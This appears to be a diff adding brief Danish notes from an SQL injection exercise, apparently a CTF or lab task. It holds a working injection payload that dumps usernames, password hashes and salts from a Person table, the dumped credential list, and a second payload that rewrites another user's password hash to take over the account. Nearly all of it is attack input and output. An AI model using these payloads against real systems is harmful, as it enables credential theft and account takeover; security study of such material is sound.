@@ -1,0 +1,23 @@
+
+
+send som headline i en besked til dig selv
+usernames',
+(
+SELECT GROUP_CONCAT(CONCAT(Username,'&', Password,"&", Salt)  SEPARATOR '\n')
+FROM Person
+)
+)#
+
+svar:
+kflarsen&29006d99bd6d477664f43ee3a5dde925&salt
+br0ns&5a8441c3702aacd4103fd8675692f015&evil
+kokjo&fe7ecc4de28b2c83c016b5c6c2acd826&4242
+kristoff3r&fe7ecc4de28b2c83c016b5c6c2acd826&4242
+NicolaiNebel&fe7ecc4de28b2c83c016b5c6c2acd826&4242
+rloewe&7bfd638c108b8dba714aeb2e8349603c&4242
+you&5a8441c3702aacd4103fd8675692f015&evil
+
+
+attack2
+Sæt profile. br0ns har nu password mastermind
+derp',Password='5a8441c3702aacd4103fd8675692f015',Salt='evil' WHERE Username='br0ns' #
